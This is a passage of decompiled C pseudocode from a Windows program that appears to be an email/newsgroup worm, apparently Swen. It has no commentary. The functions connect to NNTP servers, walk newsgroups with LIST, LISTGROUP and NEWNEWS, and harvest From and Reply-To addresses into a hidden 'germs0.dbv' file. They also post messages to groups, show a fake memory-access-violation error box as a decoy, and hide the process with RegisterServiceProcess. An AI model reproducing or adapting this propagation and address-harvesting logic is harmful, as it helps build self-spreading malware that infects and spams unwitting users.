  if ( (unsigned __int8)lParam != 32 )
  {
LABEL_8:
    PostQuitMessage(0);
    return 0;
  }
  sub_4018D3((int)dword_412F48);
  return 0;
}
// 412F48: using guessed type SOCKET dword_412F48[7546];

//----- (00405108) --------------------------------------------------------
HANDLE sub_405108()
{
  HANDLE result; // eax
  HANDLE FileA; // eax
  void *v2; // edi
  HANDLE v3; // eax
  HANDLE v4; // esi
  DWORD FileSize; // eax
  const char *v6; // eax
  char *v7; // edi
  char *p_Str; // ecx
  signed int i; // eax
  DWORD v10; // eax
  char v11; // [esp+Bh] [ebp-20A1h]
  char Str; // [esp+Ch] [ebp-20A0h] BYREF
  char v13[7996]; // [esp+Dh] [ebp-209Fh] BYREF
  __int16 v14; // [esp+1F49h] [ebp-163h]
  char v15; // [esp+1F4Bh] [ebp-161h]
  HANDLE hFile; // [esp+1F4Ch] [ebp-160h]
  char Buffer[197]; // [esp+1F50h] [ebp-15Ch] BYREF
  __int16 v18; // [esp+2015h] [ebp-97h]
  char v19; // [esp+2017h] [ebp-95h]
  char *v20; // [esp+2018h] [ebp-94h]
  DWORD NumberOfBytesWritten; // [esp+201Ch] [ebp-90h] BYREF
  CHAR FileName[100]; // [esp+2020h] [ebp-8Ch] BYREF
  char *v23; // [esp+2084h] [ebp-28h]
  char *v24; // [esp+2088h] [ebp-24h]
  int v25; // [esp+208Ch] [ebp-20h]
  DWORD FileSizeHigh; // [esp+2090h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+2094h] [ebp-18h]

  memset(Buffer, 0, sizeof(Buffer));
  v18 = 0;
  v19 = 0;
  ms_exc.registration.TryLevel = 0;
  result = (HANDLE)sub_406F04();
  if ( result )
  {
    wsprintfA(FileName, "%s\\nntpgroups.dat", ::Buffer);
    FileA = CreateFileA(FileName, 0xC0000000, 3u, 0, 3u, 0x80u, 0);
    v2 = FileA;
    hFile = FileA;
    if ( FileA == (HANDLE)-1 )
    {
      Str = 0;
      memset(v13, 0, sizeof(v13));
      v14 = 0;
      v15 = 0;
      wsprintfA(FileName, "%s\\swen0.dat", ::Buffer);
      v3 = CreateFileA(FileName, 0x80000000, 3u, 0, 3u, 0x80u, 0);
      hFile = v3;
      if ( v3 != (HANDLE)-1 )
      {
        NumberOfBytesWritten = GetFileSize(v3, &FileSizeHigh);
        ReadFile(hFile, Buffer, NumberOfBytesWritten, &FileSizeHigh, 0);
        CloseHandle(hFile);
        DeleteFileA(FileName);
        result = (HANDLE)sub_40584B(Buffer);
        if ( result != HANDLE_FLAG_INHERIT )
          return result;
        return sub_405108();
      }
      wsprintfA(FileName, "%s\\swen1.dat", ::Buffer);
      result = CreateFileA(FileName, 0xC0000000, 3u, 0, 3u, 0x80u, 0);
      v4 = result;
      hFile = result;
      if ( result == (HANDLE)-1 )
        goto LABEL_9;
      FileSize = GetFileSize(result, &FileSizeHigh);
      NumberOfBytesWritten = FileSize;
      if ( FileSize < 3 )
      {
        CloseHandle(v4);
        result = (HANDLE)DeleteFileA(FileName);
LABEL_9:
        ms_exc.registration.TryLevel = -1;
        return result;
      }
      ReadFile(v4, &Str, FileSize, &FileSizeHigh, 0);
      FileSizeHigh = sub_406850(NumberOfBytesWritten - 1);
      v6 = &v13[FileSizeHigh - 1];
      v24 = &v13[FileSizeHigh - 1];
      if ( v13[FileSizeHigh - 1] == 13 || v13[FileSizeHigh - 1] == 10 )
      {
        v6 += 2;
        v24 = (char *)v6;
      }
      v7 = strstr(v6, asc_4106F0);
      v23 = v7;
      if ( !v7 )
      {
        v7 = &v13[NumberOfBytesWritten - 1];
        v23 = &v13[NumberOfBytesWritten - 1];
      }
      p_Str = 0;
      v20 = 0;
      for ( i = FileSizeHigh; ; --i )
      {
        v25 = i;
        if ( i < 0 )
          break;
        if ( v13[i - 1] == 13 && v13[i] == 10 )
        {
          p_Str = &v13[i + 1];
          v20 = &v13[i + 1];
          FileSizeHigh = i + 2;
          break;
        }
      }
      if ( !p_Str )
      {
        p_Str = &Str;
        v20 = &Str;
        FileSizeHigh = 0;
      }
      if ( v7 - p_Str > 4 )
      {
        *v7 = 0;
        if ( sub_40584B(p_Str) == -1 )
        {
          SetFilePointer(v4, FileSizeHigh, 0, 0);
          if ( v7[1] == 10 )
          {
            v7 += 2;
            v23 = v7;
          }
          if ( *v7 )
          {
            v10 = strlen(v7);
            WriteFile(v4, v7, v10, &NumberOfBytesWritten, 0);
LABEL_33:
            SetEndOfFile(v4);
            goto LABEL_34;
          }
          if ( !FileSizeHigh )
          {
            CloseHandle(v4);
            v4 = 0;
            hFile = 0;
            DeleteFileA(FileName);
            goto LABEL_34;
          }
          if ( *(&v11 + FileSizeHigh) == 10 )
          {
            FileSizeHigh -= 2;
            SetFilePointer(v4, FileSizeHigh, 0, 0);
            goto LABEL_33;
          }
        }
      }
LABEL_34:
      if ( v4 )
        CloseHandle(v4);
      return sub_405108();
    }
    sub_405474(FileA);
    return (HANDLE)CloseHandle(v2);
  }
  return result;
}

//----- (00405474) --------------------------------------------------------
char *__cdecl sub_405474(HANDLE hFile)
{
  char *result; // eax
  unsigned int FileSize; // esi
  const char *v3; // edi
  char *v4; // eax
  HANDLE v5; // eax
  void *v6; // edi
  unsigned int v7; // edi
  char *v8; // eax
  void *v9; // edi
  char *v10; // eax
  char *v11; // esi
  DWORD v12; // eax
  void *v13; // [esp+Ch] [ebp-240h]
  void *v14; // [esp+10h] [ebp-23Ch]
  void *v15; // [esp+14h] [ebp-238h]
  void *v16; // [esp+18h] [ebp-234h]
  HANDLE v17; // [esp+1Ch] [ebp-230h]
  LONG lDistanceToMove; // [esp+20h] [ebp-22Ch]
  char SubStr[152]; // [esp+24h] [ebp-228h] BYREF
  char *v20; // [esp+BCh] [ebp-190h]
  int v21; // [esp+C0h] [ebp-18Ch]
  DWORD v22; // [esp+C4h] [ebp-188h]
  unsigned int v23; // [esp+C8h] [ebp-184h]
  CHAR Buffer; // [esp+CCh] [ebp-180h] BYREF
  char Source[199]; // [esp+CDh] [ebp-17Fh] BYREF
  DWORD NumberOfBytesRead; // [esp+194h] [ebp-B8h] BYREF
  LPCVOID lpBuffer; // [esp+198h] [ebp-B4h]
  char Destination[152]; // [esp+19Ch] [ebp-B0h] BYREF
  CPPEH_RECORD ms_exc; // [esp+234h] [ebp-18h]

  v23 = 0;
  memset(Destination, 0, 150);
  memset(SubStr, 0, 150);
  result = 0;
  v21 = 0;
  ms_exc.registration.TryLevel = 0;
  if ( hFile != (HANDLE)-1 )
  {
    if ( hFile )
    {
      FileSize = GetFileSize(hFile, 0);
      v22 = FileSize;
      ReadFile(hFile, &Buffer, 0xC7u, &NumberOfBytesRead, 0);
      Source[NumberOfBytesRead - 1] = 0;
      result = strchr(&Buffer, 58);
      lpBuffer = result;
      if ( result )
      {
        v3 = result + 1;
        if ( result[1] == 121 )
          v21 = 1;
        *result = 0;
        strcpy(Destination, Source);
        if ( v21 && sub_406840(0xAu) )
          sub_4063F0(Destination, hFile);
        v4 = strstr(v3, asc_4106F0);
        v20 = v4;
        if ( v4 )
          v23 = v4 - &Buffer + 2;
        while ( FileSize > v23 )
        {
          result = (char *)sub_406F04();
          if ( !result )
            return result;
          wsprintfA(&Buffer, "%s\\germs0.dbv", ::Buffer);
          v5 = CreateFileA(&Buffer, 0x80000000, 3u, 0, 3u, 0x80u, 0);
          v6 = v5;
          v17 = v5;
          if ( v5 != (HANDLE)-1 )
          {
            NumberOfBytesRead = GetFileSize(v5, 0);
            result = (char *)CloseHandle(v6);
            if ( NumberOfBytesRead > 0x1388 )
              return result;
          }
          v7 = v23;
          lDistanceToMove = FileSize >= v23 + 205 ? v7 + sub_406850(FileSize - v23 - 201) : 0;
          SetFilePointer(hFile, lDistanceToMove, 0, 0);
          ReadFile(hFile, &Buffer, 0xC7u, &NumberOfBytesRead, 0);
          Source[NumberOfBytesRead - 1] = 0;
          result = strstr(&Buffer, asc_4106F0);
          v20 = result;
          if ( !result )
            return result;
          v20 = result + 2;
          v8 = strstr(result + 2, asc_4106F0);
          lpBuffer = v8;
          if ( v8 )
            *v8 = 0;
          strcpy(SubStr, v20);
          sub_405CDC(Destination, (int)SubStr);
          v9 = operator new(FileSize + 3);
          v15 = v9;
          v16 = v9;
          if ( v9 )
          {
            SetFilePointer(hFile, 0, 0, 0);
            ReadFile(hFile, v9, FileSize, &NumberOfBytesRead, 0);
            *((_BYTE *)v9 + FileSize) = 0;
            v10 = strstr((const char *)v9, SubStr);
            v11 = v10;
            v20 = v10;
            if ( v10 )
            {
              lpBuffer = strstr(v10, asc_4106F0);
              if ( lpBuffer )
              {
                lpBuffer = (char *)lpBuffer + 2;
                lDistanceToMove = v11 - (_BYTE *)v9;
                SetFilePointer(hFile, v11 - (_BYTE *)v9, 0, 0);
                if ( *(_BYTE *)lpBuffer )
                {
                  v12 = strlen((const char *)lpBuffer);
                  WriteFile(hFile, lpBuffer, v12, &NumberOfBytesRead, 0);
                }
                SetEndOfFile(hFile);
              }
              v13 = v9;
              operator delete(v9);
              v22 = GetFileSize(hFile, 0);
            }
            else
            {
              v14 = v9;
              operator delete(v9);
            }
            FileSize = v22;
          }
        }
        CloseHandle(hFile);
        wsprintfA(&Buffer, "%s\\nntpgroups.dat", ::Buffer);
        return (char *)DeleteFileA(&Buffer);
      }
    }
  }
  return result;
}
// 405474: using guessed type char Source[199];

//----- (0040584B) --------------------------------------------------------
int __cdecl sub_40584B(char *cp)
{
  int result; // eax
  char *v2; // eax
  DWORD v3; // eax
  char *v4; // eax
  char *v5; // eax
  char *v6; // eax
  HANDLE hFile; // [esp+Ch] [ebp-75BCh]
  int v8; // [esp+10h] [ebp-75B8h]
  CHAR FileName[100]; // [esp+14h] [ebp-75B4h] BYREF
  char Str[30000]; // [esp+78h] [ebp-7550h] BYREF
  char *v11; // [esp+75A8h] [ebp-20h]
  DWORD NumberOfBytesWritten; // [esp+75ACh] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+75B0h] [ebp-18h]

  v8 = 0;
  ms_exc.registration.TryLevel = 0;
  if ( !sub_406F04() )
    goto LABEL_2;
  sub_401B15(dword_412F48, 1);
  sub_4018D3((int)dword_412F48);
  Str[0] = 0;
  if ( !sub_401946((int)dword_412F48, cp, 0x77u, hWnd) && !sub_401946((int)dword_412F48, cp, 0x77u, hWnd) )
  {
    result = -1;
    goto LABEL_3;
  }
  if ( WaitForSingleObject(hObject, 0x2EE0u) == 258 )
    goto LABEL_8;
  v2 = sub_401830((int)dword_412F48, FileName, 4u);
  if ( strncmp(v2, a20, 2u) )
    goto LABEL_8;
  if ( FileName[2] == 48 )
    v8 = 1;
  if ( !sub_401B0D(dword_412F48) )
  {
LABEL_8:
    sub_405B25((HANDLE)0xFFFFFFFF);
LABEL_2:
    result = 0;
    goto LABEL_3;
  }
  wsprintfA(FileName, "%s\\nntpgroups.dat", Buffer);
  hFile = CreateFileA(FileName, 0x40000000u, 3u, 0, 2u, 0x80u, 0);
  wsprintfA(FileName, "[%s:%c]\r\n", cp, v8 == 0 ? 110 : 121);
  v3 = strlen(FileName);
  WriteFile(hFile, FileName, v3, &NumberOfBytesWritten, 0);
  strcpy(FileName, aList);
  sub_401A9E(dword_412F48, FileName);
  if ( WaitForSingleObject(hObject, 0x4E20u) == 258
    || (v4 = sub_401830((int)dword_412F48, Str, 0x752Fu), strncmp(v4, a215, 3u)) )
  {
LABEL_25:
    sub_405B25(hFile);
    goto LABEL_2;
  }
  v5 = strstr(Str, asc_4106F0);
  v11 = v5;
  if ( v5 )
    v6 = v5 + 2;
  else
    v6 = Str;
  v11 = v6;
  if ( !sub_405B67(v6, hFile) )
  {
    sub_401B15(dword_412F48, 0);
    do
    {
      NumberOfBytesWritten = WaitForSingleObject(hObject, 0xC350u);
      if ( NumberOfBytesWritten == 258 || !sub_401B0D(dword_412F48) )
        goto LABEL_25;
      sub_401830((int)dword_412F48, Str, 0x752Fu);
    }
    while ( !Str[0] || !sub_405B67(Str, hFile) );
  }
  sub_4018D3((int)dword_412F48);
  if ( hFile != (HANDLE)-1 )
    CloseHandle(hFile);
  result = 1;
LABEL_3:
  ms_exc.registration.TryLevel = -1;
  return result;
}
// 412F48: using guessed type SOCKET dword_412F48[7546];

//----- (00405B25) --------------------------------------------------------
SOCKET __cdecl sub_405B25(HANDLE hObject)
{
  SOCKET result; // eax
  CHAR FileName[100]; // [esp+0h] [ebp-64h] BYREF

  result = sub_4018D3((int)dword_412F48);
  if ( hObject != (HANDLE)-1 )
  {
    CloseHandle(hObject);
    wsprintfA(FileName, "%s\\nntpgroups.dat", Buffer);
    return DeleteFileA(FileName);
  }
  return result;
}
// 412F48: using guessed type SOCKET dword_412F48[7546];

//----- (00405B67) --------------------------------------------------------
int __cdecl sub_405B67(char *Str, HANDLE hFile)
{
  char *v2; // eax
  char *v3; // esi
  int result; // eax
  char *v5; // eax
  char *v6; // eax
  const char *v7; // edi
  char *v8; // eax
  const char *v9; // eax
  DWORD v10; // eax
  int v11; // [esp+Ch] [ebp-30h]
  DWORD NumberOfBytesWritten; // [esp+18h] [ebp-24h] BYREF
  char *v13; // [esp+1Ch] [ebp-20h]
  void *v14; // [esp+20h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+24h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  if ( !hFile || hFile == (HANDLE)-1 || !Str )
  {
    result = 0;
    goto LABEL_10;
  }
  if ( strncmp(Str, asc_411840, 3u) )
  {
    v2 = strstr(Str, asc_4106F0);
    if ( !v2 )
    {
      result = 0;
      goto LABEL_9;
    }
    v3 = v2 + 2;
    while ( strncmp(v3, asc_411840, 3u) )
    {
      v5 = strstr(v3, asc_4106F0);
      v13 = v5;
      if ( v5 )
      {
        *v5 = 0;
        v13 = v5 + 2;
        v6 = strchr(v3, 32);
        if ( v6 )
        {
          *v6 = 0;
          v7 = v6 + 1;
          if ( v6[1] )
          {
            v8 = strchr(v7, 32);
            v14 = v8;
            if ( v8 )
            {
              v9 = v8 + 1;
              v14 = (void *)v9;
              if ( *v9 )
              {
                v11 = atoi(v9);
                if ( atoi(v7) - v11 > 10 )
                {
                  strcat(v3, asc_4106F0);
                  v10 = strlen(v3);
                  WriteFile(hFile, v3, v10, &NumberOfBytesWritten, 0);
                }
              }
            }
          }
        }
      }
      v3 = v13;
      if ( !v13 )
      {
        ms_exc.registration.TryLevel = -1;
        *Str = 0;
        return 0;
      }
    }
  }
  result = 1;
LABEL_9:
  *Str = 0;
LABEL_10:
  ms_exc.registration.TryLevel = -1;
  return result;
}

//----- (00405CDC) --------------------------------------------------------
void __cdecl sub_405CDC(char *cp, int a2)
{
  int v2; // eax
  DWORD (__stdcall *v3)(HANDLE, DWORD); // ebx
  unsigned int v4; // eax
  char *v5; // eax
  char *v6; // eax
  int v7; // eax
  char *v8; // eax
  unsigned int v9; // [esp-14h] [ebp-75F0h]
  unsigned int v10; // [esp-10h] [ebp-75ECh]
  unsigned int v11; // [esp-Ch] [ebp-75E8h]
  unsigned int v12; // [esp-8h] [ebp-75E4h]
  unsigned int v13; // [esp-4h] [ebp-75E0h]
  char *v14; // [esp+10h] [ebp-75CCh]
  int v15; // [esp+18h] [ebp-75C4h]
  CHAR Destination[100]; // [esp+20h] [ebp-75BCh] BYREF
  char Str[30008]; // [esp+84h] [ebp-7558h] BYREF
  char *v18; // [esp+75BCh] [ebp-20h]
  DWORD v19; // [esp+75C0h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+75C4h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  if ( !sub_406F04() )
    goto LABEL_30;
  sub_401B15(dword_412F48, 1);
  sub_401BE7(&dword_41A818);
  v2 = sub_401946((int)dword_412F48, cp, 0x77u, hWnd);
  if ( v2 == 1 )
  {
    v3 = WaitForSingleObject;
    if ( WaitForSingleObject(hObject, 0x2EE0u) == 258 )
      goto LABEL_30;
    sub_401830((int)dword_412F48, Destination, 4u);
    if ( strncmp(Destination, a20, 2u) )
      goto LABEL_30;
  }
  else
  {
    if ( !v2 )
    {
LABEL_30:
      ms_exc.registration.TryLevel = -1;
      return;
    }
    v3 = WaitForSingleObject;
  }
  wsprintfA(Destination, "LISTGROUP %s\r\n", (const char *)a2);
  sub_401A9E(dword_412F48, Destination);
  if ( v3(hObject, 0x3A98u) == 258 )
    goto LABEL_30;
  sub_401830((int)dword_412F48, Str, 0x7535u);
  if ( strncmp(Str, a211, 3u) )
  {
    if ( !sub_401B0D(dword_412F48) )
      goto LABEL_30;
    v13 = sub_406850(0x3Bu);
    v12 = sub_406850(0x3Bu);
    v11 = sub_406850(0x17u);
    v10 = sub_406850(0x1Bu);
    v9 = sub_406850(0xCu);
    v4 = sub_406850(0x14u);
    wsprintfA(Destination, "NEWNEWS %s %02u%02u%02u %02u%02u%02u", (const char *)a2, v4 + 79, v9, v10, v11, v12, v13);
    if ( sub_406840(0x32u) )
      strcat(Destination, aGmt);
    strcat(Destination, asc_4106F0);
    sub_401A9E(dword_412F48, Destination);
    if ( v3(hObject, 0x61A8u) == 258 )
      goto LABEL_30;
    sub_401830((int)dword_412F48, Str, 0x7535u);
    if ( strncmp(Str, a230, 3u) )
    {
      sub_4018D3((int)dword_412F48);
      goto LABEL_30;
    }
  }
  if ( !sub_401B0D(dword_412F48) )
    goto LABEL_30;
  v5 = strstr(Str, asc_4106F0);
  v18 = v5;
  if ( v5 )
    v6 = v5 + 2;
  else
    v6 = Str;
  v18 = v6;
  if ( !sub_40610E(v6, 1) )
  {
    sub_401B15(dword_412F48, 0);
    do
    {
      v19 = v3(hObject, 0xC350u);
      if ( v19 == 258 || !sub_401B0D(dword_412F48) )
        goto LABEL_29;
      sub_401830((int)dword_412F48, Str, 0x7535u);
    }
    while ( !Str[0] || !sub_40610E(Str, 0) );
  }
  if ( !sub_401B0D(dword_412F48) )
  {
LABEL_29:
    sub_401BE7(&dword_41A818);
    goto LABEL_30;
  }
  if ( sub_401D8A(&dword_41A818) )
  {
    sub_401B15(dword_412F48, 0);
    v7 = sub_401D8A(&dword_41A818);
    v14 = (char *)operator new(75 * v7);
    if ( v14 )
    {
      v15 = sub_401D8A(&dword_41A818);
      sub_406212(0, 0);
      v8 = sub_401D8E(&dword_41A818, v14, 0);
      sub_401A9E(dword_412F48, v8);
      sub_401BE7(&dword_41A818);
      do
      {
        v19 = v3(hObject, 0xC350u);
        sub_401830((int)dword_412F48, Str, 0x752Fu);
      }
      while ( Str[0] && !sub_406212(Str, v15) && v19 != 258 && sub_401B0D(dword_412F48) );
      if ( sub_401D8A(&dword_41A818) )
      {
        wsprintfA(Destination, "%s\\germs0.dbv", Buffer);
        sub_401C5A(&dword_41A818, Destination);
      }
      operator delete(v14);
    }
  }
  ms_exc.registration.TryLevel = -1;
  sub_401BE7(&dword_41A818);
}
// 412F48: using guessed type SOCKET dword_412F48[7546];
// 41A818: using guessed type int dword_41A818;

//----- (0040610E) --------------------------------------------------------
int __cdecl sub_40610E(char *Str, int a2)
{
  char *v4; // eax
  char *v5; // [esp+10h] [ebp-1Ch]

  if ( a2 )
    sz[0] = 0;
  while ( Str )
  {
    if ( !strncmp(Str, asc_411840, 3u) )
      return 1;
    v4 = strstr(Str, asc_4106F0);
    v5 = v4;
    if ( v4 )
    {
      *v4 = 0;
      v5 = v4 + 2;
      if ( sz[0] )
      {
        strcat(sz, Str);
        if ( !strstr(sz, asc_4106F0) )
          sub_401B22((char **)&dword_41A818, sz, 0);
        sz[0] = 0;
      }
      else
      {
        sub_401B22((char **)&dword_41A818, Str, 0);
      }
    }
    else if ( strlen(Str) < 0x12C )
    {
      strcpy(sz, Str);
    }
    Str = v5;
  }
  return 0;
}
// 41A818: using guessed type int dword_41A818;

//----- (00406212) --------------------------------------------------------
int __cdecl sub_406212(LPSTR lpsz, int a2)
{
  const char *v3; // eax
  char *v4; // eax
  int v5; // esi
  char *v6; // eax
  unsigned int v7; // eax
  char *v8; // eax
  char *v9; // eax
  const char *v10; // eax
  unsigned int i; // [esp+10h] [ebp-24h]
  char *Str1; // [esp+14h] [ebp-20h]
  char *Str; // [esp+18h] [ebp-1Ch]
  char *Stra; // [esp+18h] [ebp-1Ch]

  if ( !a2 )
  {
    dword_41A6E4 = 0;
    dword_41A6E0 = 0;
    return 0;
  }
  if ( !lpsz )
    return 0;
  CharLowerA(lpsz);
  for ( i = 0; i < 2; ++i )
  {
    Str = lpsz;
    while ( Str )
    {
      v3 = aFrom_1;
      if ( i )
        v3 = aReplyTo;
      v4 = strstr(Str, v3);
      v5 = (int)v4;
      if ( !v4 )
        break;
      v6 = strstr(v4 + 2, asc_4106F0);
      Str = v6;
      if ( v6 )
      {
        v7 = (unsigned int)&v6[-v5];
        if ( v7 > 0xC && v7 < 0xC8 )
          sub_407CBA(v5, v7 + 1);
      }
    }
  }
  Str1 = lpsz;
  do
  {
    if ( dword_41A6E0 )
    {
      if ( dword_41A6E0 == 1 )
      {
        v9 = strstr(Str1, Str2);
        if ( !v9 )
          return 0;
        ++dword_41A6E4;
        v10 = v9 + 5;
        Str1 = (char *)v10;
        if ( !*v10 )
        {
          if ( dword_41A6E4 < (unsigned int)a2 )
          {
            dword_41A6E0 = 0;
            return 0;
          }
          return 1;
        }
        if ( strncmp(v10, a221, 3u) )
          dword_41A6E0 = 2;
      }
      else if ( dword_41A6E0 == 2 )
      {
        v8 = strstr(Str1, asc_4106F0);
        if ( !v8 )
          return 0;
        ++dword_41A6E4;
        Stra = v8 + 2;
        if ( !strncmp(v8 + 2, a221, 3u) )
          dword_41A6E0 = 1;
        Str1 = Stra;
      }
    }
    else
    {
      dword_41A6E0 = (strncmp(Str1, a221, 3u) != 0) + 1;
    }
    if ( dword_41A6E4 >= (unsigned int)a2 )
      return 1;
  }
  while ( Str1 );
  return 0;
}
// 41A6E0: using guessed type int dword_41A6E0;
// 41A6E4: using guessed type int dword_41A6E4;

//----- (004063F0) --------------------------------------------------------
char *__cdecl sub_4063F0(char *cp, HANDLE hFile)
{
  DWORD FileSize; // eax
  char *result; // eax
  char *v4; // edi
  char *v5; // eax
  char *v6; // eax
  char *v7; // edi
  char *v8; // eax
  char Destination[352]; // [esp+20h] [ebp-2B8h] BYREF
  char *Source; // [esp+180h] [ebp-158h]
  int v11; // [esp+184h] [ebp-154h]
  char Buffer[300]; // [esp+188h] [ebp-150h] BYREF
  char *v13; // [esp+2B4h] [ebp-24h]
  DWORD NumberOfBytesRead; // [esp+2B8h] [ebp-20h] BYREF
  LONG lDistanceToMove; // [esp+2BCh] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+2C0h] [ebp-18h]

  memset(Destination, 0, 350);
  v11 = 1;
  ms_exc.registration.TryLevel = 0;
  FileSize = GetFileSize(hFile, 0);
  if ( FileSize > 0x12C )
    lDistanceToMove = sub_406850(FileSize - 150);
  else
    lDistanceToMove = 0;
  SetFilePointer(hFile, lDistanceToMove, 0, 0);
  ReadFile(hFile, Buffer, 0x12Bu, &NumberOfBytesRead, 0);
  Buffer[NumberOfBytesRead] = 0;
  for ( result = strstr(Buffer, asc_4106F0); ; result = v4 )
  {
    Source = result;
    if ( !result )
      break;
    result += 2;
    if ( !*result )
      break;
    Source = result;
    result = strstr(result, asc_4106F0);
    v4 = result;
    v13 = result;
    if ( !result )
      break;
    *result = 0;
    if ( v11 )
      v11 = 0;
    else
      strcat(Destination, asc_4118B4);
    strcat(Destination, Source);
  }
  if ( Destination[0] )
  {
    sub_401830((int)dword_412F48, Buffer, 4u);
    sub_401B15(dword_412F48, 1);
    result = (char *)sub_401946((int)dword_412F48, cp, 0x77u, hWnd);
    if ( result == (char *)1 )
    {
      result = (char *)WaitForSingleObject(hObject, 0x2EE0u);
      if ( result == (char *)258 )
        return result;
      v5 = sub_401830((int)dword_412F48, Buffer, 4u);
      result = (char *)strncmp(v5, a20, 2u);
      if ( result )
        return result;
    }
    else if ( !result )
    {
      return result;
    }
    sub_401A9E(dword_412F48, aPost_0);
    result = (char *)WaitForSingleObject(hObject, 0x1B58u);
    if ( result != (char *)258 )
    {
      v6 = sub_401830((int)dword_412F48, Buffer, 3u);
      result = (char *)strcmp(v6, a340);
      if ( !result )
      {
        result = (char *)operator new(0x2BF20u);
        v7 = result;
        if ( result )
        {
          sub_402478(result, 0, Destination);
          sub_401A9E(dword_412F48, v7);
          NumberOfBytesRead = WaitForSingleObject(hObject, 0x30D40u);
          operator delete(v7);
          if ( NumberOfBytesRead != 258 )
          {
            v8 = sub_401830((int)dword_412F48, Buffer, 3u);
            result = (char *)strcmp(v8, a240);
            if ( result )
              return result;
            sub_401A9E(dword_412F48, aQuit);
            Sleep(0x2BCu);
          }
          return (char *)sub_4018D3((int)dword_412F48);
        }
      }
    }
  }
  return result;
}
// 412F48: using guessed type SOCKET dword_412F48[7546];
// 4063F0: using guessed type char Buffer[300];

//----- (004066B9) --------------------------------------------------------
int sub_4066B9()
{
  sub_4066C3();
  return atexit(sub_4066E1);
}

//----- (004066C3) --------------------------------------------------------
int sub_4066C3()
{
  int result; // eax

  result = 0;
  dword_41A820 = 0;
  dword_41A818 = 0;
  dword_41A81C = 0;
  return result;
}
// 41A818: using guessed type int dword_41A818;
// 41A81C: using guessed type int dword_41A81C;
// 41A820: using guessed type int dword_41A820;

//----- (004066E1) --------------------------------------------------------
void __cdecl sub_4066E1()
{
  sub_401BE7(&dword_41A818);
}
// 41A818: using guessed type int dword_41A818;

//----- (004066EB) --------------------------------------------------------
BOOL __cdecl sub_4066EB(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, DWORD dwType, LPCSTR lpString)
{
  BOOL result; // eax
  LSTATUS v6; // eax
  int v7; // [esp-4h] [ebp-34h]
  DWORD dwDisposition; // [esp+Ch] [ebp-24h] BYREF
  HKEY phkResult; // [esp+10h] [ebp-20h] BYREF
  LSTATUS v10; // [esp+14h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+18h] [ebp-18h]

  phkResult = 0;
  ms_exc.registration.TryLevel = 0;
  RegCreateKeyExA(hKey, lpSubKey, 0, 0, 0, 2u, 0, &phkResult, &dwDisposition);
  result = 0;
  if ( phkResult )
  {
    if ( dwType == 4 )
    {
      v6 = RegSetValueExA(phkResult, lpValueName, 0, 4u, (const BYTE *)lpString, 4u);
    }
    else
    {
      v7 = lstrlenA(lpString);
      v6 = RegSetValueExA(phkResult, lpValueName, 0, dwType, (const BYTE *)lpString, v7);
    }
    v10 = v6;
    RegCloseKey(phkResult);
    if ( !v10 )
      result = 1;
  }
  ms_exc.registration.TryLevel = -1;
  return result;
}

//----- (0040679E) --------------------------------------------------------
BOOL __cdecl sub_40679E(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE lpData)
{
  BOOL result; // eax
  HKEY phkResult; // [esp+Ch] [ebp-28h] BYREF
  DWORD cbData; // [esp+10h] [ebp-24h] BYREF
  LSTATUS v7; // [esp+14h] [ebp-20h]
  DWORD Type; // [esp+18h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+1Ch] [ebp-18h]

  phkResult = 0;
  cbData = 100;
  ms_exc.registration.TryLevel = 0;
  *lpData = 0;
  RegOpenKeyExA(hKey, lpSubKey, 0, 1u, &phkResult);
  result = 0;
  if ( phkResult )
  {
    v7 = RegQueryValueExA(phkResult, lpValueName, 0, &Type, lpData, &cbData);
    RegCloseKey(phkResult);
    if ( !v7 )
      result = 1;
  }
  ms_exc.registration.TryLevel = -1;
  return result;
}

//----- (00406840) --------------------------------------------------------
BOOL __cdecl sub_406840(unsigned int a1)
{
  return a1 >= sub_406850(0x64u);
}

//----- (00406850) --------------------------------------------------------
unsigned int __cdecl sub_406850(unsigned int a1)
{
  int v1; // ecx
  unsigned int TickCount; // eax
  int v4; // esi

  v1 = 0;
  if ( a1 )
  {
    TickCount = GetTickCount();
    v4 = TickCount;
    if ( TickCount != dword_41A824 )
    {
      srand(TickCount);
      dword_41A824 = v4;
    }
    if ( a1 >= 0x8000 )
      return a1 / 0x7FFF * rand();
    else
      return rand() % a1 + 1;
  }
  return v1;
}
// 41A824: using guessed type int dword_41A824;

//----- (004068F4) --------------------------------------------------------
int __cdecl sub_4068F4(int a1, unsigned int a2)
{
  unsigned int i; // [esp+Ch] [ebp-1Ch]

  for ( i = 0; i < a2; ++i )
    *(_BYTE *)(i + a1) = sub_406850(0x1Au) + 96;
  *(_BYTE *)(a1 + a2) = 0;
  return a1;
}

//----- (0040696B) --------------------------------------------------------
int __cdecl sub_40696B(int a1, unsigned int a2)
{
  unsigned int i; // [esp+Ch] [ebp-1Ch]

  for ( i = 0; i < a2; ++i )
    *(_BYTE *)(i + a1) = sub_406850(9u) + 48;
  *(_BYTE *)(a1 + a2) = 0;
  return a1;
}

//----- (004069E2) --------------------------------------------------------
void sub_4069E2()
{
  const char *v0; // eax
  const char *v1; // eax
  CHAR Text[100]; // [esp+0h] [ebp-70h] BYREF
  char v3[12]; // [esp+64h] [ebp-Ch] BYREF

  strcpy(Text, aMemoryAccessVi);
  v0 = (const char *)sub_40696B((int)v3, 4u);
  strcat(Text, v0);
  strcat(Text, Source);
  v1 = (const char *)sub_40696B((int)v3, 8u);
  strcat(Text, v1);
  MessageBoxA(0, Text, aErrorOccurred, 0x10u);
  Sleep(0x4B0u);
}

//----- (00406A51) --------------------------------------------------------
void sub_406A51()
{
  HMODULE ModuleHandleA; // eax
  FARPROC RegisterServiceProcess; // eax

  if ( dword_41A66C )
  {
    ModuleHandleA = GetModuleHandleA(ModuleName);
    if ( ModuleHandleA )
    {
      RegisterServiceProcess = GetProcAddress(ModuleHandleA, aRegisterservic);
      if ( RegisterServiceProcess )
        ((void (__stdcall *)(_DWORD, int))RegisterServiceProcess)(0, 1);
    }
  }
}
